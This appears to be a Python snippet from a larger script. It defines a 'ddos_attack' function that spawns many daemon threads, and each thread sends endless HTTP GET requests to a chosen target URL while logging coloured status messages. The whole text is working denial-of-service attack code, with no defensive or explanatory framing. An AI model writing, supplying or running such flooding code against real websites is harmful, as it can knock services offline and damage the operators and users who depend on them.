def ddos_attack(target_url, num_requests):
    """A simple DDoS attack using threading."""
    def send_request():
        try:
            while True:
                requests.get(target_url)
                logs.append(f"{CYAN}Sent request to {target_url}")
        except Exception as e:
            logs.append(f"{RED}Error: {e}")

    for _ in range(num_requests):
        thread = threading.Thread(target=send_request)
        thread.daemon = True
        thread.start()

